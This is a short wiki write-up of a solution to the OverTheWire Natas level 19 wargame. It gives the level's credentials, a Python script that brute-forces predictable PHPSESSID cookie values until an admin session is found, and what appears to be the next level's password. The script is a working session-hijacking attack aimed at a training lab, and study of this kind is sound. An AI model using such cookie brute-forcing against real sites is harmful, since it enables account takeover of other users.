[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")
Username: natas19 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs URL:
<http://natas19.natas.labs.overthewire.org>

we bruteforce the sessionid because the only random chars where the
selected three.

`  `
`import requests`
`  `
`for i in range(1000):`
`    session = requests.Session()`
`    nums = list(format(i,'03'))`
`    session.cookies.set('PHPSESSID',"3{}3{}3{}2d61646d696e".format(nums[0],nums[1],nums[2]))`
`    response = session.get('http://natas19.natas.labs.overthewire.org', auth=('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))`
`    if("You are an admin" in response.text):`
`        print(response.text)`
`        break`
`  `
`  `

eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF